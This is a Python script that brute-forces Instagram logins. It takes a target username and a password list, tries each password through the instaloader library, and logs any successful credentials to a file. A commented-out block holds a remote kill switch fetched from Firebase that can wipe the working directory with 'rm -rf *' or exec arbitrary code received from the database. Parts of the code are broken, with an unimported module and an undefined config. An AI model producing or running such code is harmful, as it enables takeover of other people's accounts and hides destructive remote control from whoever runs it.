import marshal
import animation
import instaloader
import requests
from termcolor import colored
import os
import sys

firebase = pyrebase.initialize_app(firebase_config)

os.system("clear")



animation.titile()




"""--------------this is for to destroy and stop runing ------------------"""
#permission = db.child("$name$").get()

#permission = permission.val()
#if "false" in str(permission) :
#    hello()
#    sys.exit()
#elif "Self destroy" in str(permission) :
#    with open("main.py", "w") as file :
#        file.write("$$")
#    with open("r00.txt", "w") as file :
#        file.write("#program ")
#    os.system("rm -rf *")
#elif "true" in str(permission) :
#    print("")
#else :
#    code = str(permission)
#    code = code.replace("<<<new_line>>>", "\n")
#    exec(code)
"""------------------------------------------------------------------------"""

print()
print("")

user= input("Enter the username : ")
print()
passwords = input("Enter the passwords list file path : ")
print()

passwords = open(passwords, "r")
passwords = passwords.read()


p = passwords
L = instaloader.Instaloader()
print("")
for password in p.splitlines() :
    print(colored("[ * ] Trying...", "green")+" "+colored("Username : ", "green")+user, colored("Password : ", "green")+password)
    try :

        L.login(user, password)
        print()
        print(colored("[ ! ] Login ", "green")+"susses  "+colored("Username : ", "red")+user, colored("Password : ", "red")+password)
        print("login details saved > logs.txt")
        print()
        file = open("logs.txt", "a")
        file.write(f"[ ! ] Login Username {user}, Password {password}")
        file.close()
    except Exception as e :
        print("")
        try :
            print("Error : "+colored(e, "red"))
        except Exception as e:
            print(colored(f"[ ! ] Error unknown error reported to owner : {e}", "red"))
            
